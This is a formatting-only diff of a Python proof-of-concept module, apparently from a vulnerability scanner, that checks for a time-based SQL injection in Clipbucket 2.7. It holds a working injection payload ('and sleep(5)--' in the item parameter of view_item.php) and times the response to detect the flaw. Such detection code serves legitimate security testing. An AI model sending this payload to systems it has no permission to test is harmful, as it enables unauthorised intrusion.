@@ -6,11 +6,12 @@ import time
 import urllib2
 import httplib
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Clipbucket_0001' # 平台漏洞编号，留空
+    vuln_id = 'Clipbucket_0001'  # 平台漏洞编号，留空
     name = 'Clipbucket 2.7 SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-03-03'  # 漏洞公布时间
     desc = '''
         ClipBucket is an OpenSource Multimedia Management Script Provided Free to the Community.
@@ -28,6 +29,7 @@ class Vuln(ABVuln):
     product = 'Clipbucket'  # 漏洞应用名称
     product_version = 'Clipbucket 2.7'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '0462c66f-6e23-42a5-ad5f-49e0804eb3fc'
     author = 'cscan'  # POC编写者
@@ -40,7 +42,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/clipbucket/view_item.php?item=a%27and%20sleep(5)-- # &type=photos&collection=9'
             start_time = time.time()
             response = requests.get(self.target + payload)
@@ -48,13 +50,14 @@ class Poc(ABPoc):
 
             if time.time() - start_time > 5:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
